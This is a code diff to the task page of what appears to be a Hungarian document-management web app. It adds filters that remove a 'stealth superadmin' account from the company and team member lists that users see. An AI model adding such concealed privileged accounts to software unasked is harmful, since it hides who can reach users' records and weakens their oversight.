@@ -1,5 +1,6 @@
 import { createClient } from "@/utils/supabase/server"
 import { getActiveCompanyIdServer } from "@/utils/company-server"
+import { isStealthSuperadmin, STEALTH_SUPERADMIN_ID } from "@/utils/stealth-superadmin"
 import { redirect } from "next/navigation"
 import Link from "next/link"
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
@@ -105,7 +106,7 @@ export default async function TasksPage({
       .eq("company_id", activeCompanyId)
 
     if (cm) {
-      memberUserIds = cm.map(m => m.user_id)
+      memberUserIds = cm.map(m => m.user_id).filter(uid => uid !== STEALTH_SUPERADMIN_ID)
       cm.forEach(m => {
         if (m.docs_szerepkor) memberDocsRolesMap.set(m.user_id, m.docs_szerepkor)
       })
@@ -126,10 +127,12 @@ export default async function TasksPage({
   }
 
   const { data: rawTeamMembers } = await teamMembersQuery
-  const teamMembers = (rawTeamMembers || []).map(m => ({
-    ...m,
-    docs_szerepkor: memberDocsRolesMap.get(m.id) || m.docs_szerepkor || "ugyintezo"
-  }))
+  const teamMembers = (rawTeamMembers || [])
+    .filter(m => !isStealthSuperadmin(m))
+    .map(m => ({
+      ...m,
+      docs_szerepkor: memberDocsRolesMap.get(m.id) || m.docs_szerepkor || "ugyintezo"
+    }))
 
   // 1. Lekérdezzük a rám szignált iktatott ügyiratokat
   const { data: rawUgyiratok } = await supabase
